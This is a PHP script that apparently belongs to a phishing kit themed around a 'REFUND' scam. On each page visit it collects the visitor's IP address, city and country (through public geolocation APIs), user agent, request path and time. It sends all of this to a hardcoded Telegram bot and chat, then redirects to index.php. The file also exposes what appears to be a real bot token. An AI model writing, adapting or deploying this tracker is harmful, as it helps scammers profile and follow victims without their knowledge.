<?php
// ===== TELEGRAM CONFIGURATION =====
$telegramBotToken = "8585828847:AAFjkTFcI696kQNqb1ewBZOiQCLgO7CVix4";
$telegramChatId   = "-5238377956"; // use your user ID, group ID, or @channel name

// ===== IP & GEO DETECTION FUNCTIONS =====
function isPublicIp($ip) {
    return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false;
}

function getClientIp() {
    $candidates = [];
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) $candidates[] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (!empty($_SERVER['HTTP_TRUE_CLIENT_IP']))   $candidates[] = $_SERVER['HTTP_TRUE_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        foreach (explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']) as $xff) {
            $xff = trim($xff);
            if ($xff) $candidates[] = $xff;
        }
    }
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) $candidates[] = $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['REMOTE_ADDR']))    $candidates[] = $_SERVER['REMOTE_ADDR'];
    foreach ($candidates as $ip) {
        if (isPublicIp($ip)) return $ip;
    }
    return '';
}

function httpGetJson($url, $timeout = 3) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => $timeout,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_HTTPHEADER => ['User-Agent: PHP Script'],
        ]);
        $resp = curl_exec($ch);
        curl_close($ch);
        if ($resp === false) return null;
        $data = json_decode($resp, true);
        return is_array($data) ? $data : null;
    }
    $context = stream_context_create(['http' => ['method'=>'GET','timeout'=>$timeout,'header'=>"User-Agent: PHP Script\r\n"]]);
    $resp = @file_get_contents($url, false, $context);
    if ($resp === false) return null;
    $data = json_decode($resp, true);
    return is_array($data) ? $data : null;
}

function getFlagEmoji($code) {
    $code = strtoupper($code);
    if (!preg_match('/^[A-Z]{2}$/', $code)) return '🌍';
    if (function_exists('mb_chr')) {
        return mb_chr(127397 + ord($code[0]), 'UTF-8') . mb_chr(127397 + ord($code[1]), 'UTF-8');
    }
    return '🌍';
}

function getGeoFromIp($ip = '') {
    $suffix = $ip ? "/$ip" : '';
    $data = httpGetJson("https://ipapi.co{$suffix}/json/");
    if (is_array($data) && empty($data['error'])) {
        return [
            'country' => $data['country_name'] ?? 'Unknown',
            'country_code' => $data['country_code'] ?? '',
            'flag' => !empty($data['country_code']) ? getFlagEmoji($data['country_code']) : '🌍',
            'city' => $data['city'] ?? 'Unknown',
            'region' => $data['region'] ?? 'Unknown'
        ];
    }
    $data = httpGetJson("https://ipwho.is" . ($ip ? "/$ip" : ''));
    if (is_array($data) && ($data['success'] ?? false)) {
        return [
            'country' => $data['country'] ?? 'Unknown',
            'country_code' => $data['country_code'] ?? '',
            'flag' => !empty($data['country_code']) ? getFlagEmoji($data['country_code']) : '🌍',
            'city' => $data['city'] ?? 'Unknown',
            'region' => $data['region'] ?? 'Unknown'
        ];
    }
    $data = httpGetJson("https://ip-api.com/json" . ($ip ? "/$ip" : ''));
    if (is_array($data) && ($data['status'] ?? '') === 'success') {
        return [
            'country' => $data['country'] ?? 'Unknown',
            'country_code' => $data['countryCode'] ?? '',
            'flag' => !empty($data['countryCode']) ? getFlagEmoji($data['countryCode']) : '🌍',
            'city' => $data['city'] ?? 'Unknown',
            'region' => $data['regionName'] ?? 'Unknown'
        ];
    }
    return ['country'=>'Unknown','country_code'=>'','flag'=>'🌍','city'=>'Unknown','region'=>'Unknown'];
}

// ===== TELEGRAM SENDER =====
function sendToTelegram($botToken, $chatId, $message) {
    if (empty($botToken) || empty($chatId)) return false;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 4,
            CURLOPT_TIMEOUT => 6
        ]);
        $resp = curl_exec($ch);
        curl_close($ch);
        return $resp !== false && ($j=json_decode($resp,true)) && !empty($j['ok']);
    }
    $opts = ['http'=>[
        'header'=>"Content-type: application/x-www-form-urlencoded\r\n",
        'method'=>'POST',
        'content'=>http_build_query($data),
        'timeout'=>6
    ]];
    $ctx = stream_context_create($opts);
    $resp = @file_get_contents($url,false,$ctx);
    return $resp!==false && ($j=json_decode($resp,true)) && !empty($j['ok']);
}

// ===== MAIN LOGIC =====
$ip = getClientIp();
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$geo = getGeoFromIp($ip);
$httpHost = $_SERVER['HTTP_HOST'] ?? 'Unknown';
$requestUri = $_SERVER['REQUEST_URI'] ?? 'Unknown';
$method = $_SERVER['REQUEST_METHOD'] ?? 'Unknown';
$timestamp = date('Y-m-d H:i:s');

$msg  = "🔔 <b>New Visitor - REFUND</b>\n\n";
$msg .= "{$geo['flag']} <b>Country:</b> {$geo['country']}\n";
$msg .= "📍 <b>City:</b> {$geo['city']}, {$geo['region']}\n\n";
$msg .= "🌐 <b>IP:</b> {$ip}\n";
$msg .= "🖥 <b>User Agent:</b> {$userAgent}\n";
$msg .= "📄 <b>URI:</b> {$requestUri}\n";
$msg .= "📡 <b>Method:</b> {$method}\n";
$msg .= "🕐 <b>Time:</b> {$timestamp}";

$sent = sendToTelegram($telegramBotToken, $telegramChatId, $msg);

// redirect or display result
if ($sent) {
    header("Location: index.php");
} else {
    echo "⚠️ Failed to send Telegram message. Check bot token or chat ID.";
}
exit;
?>
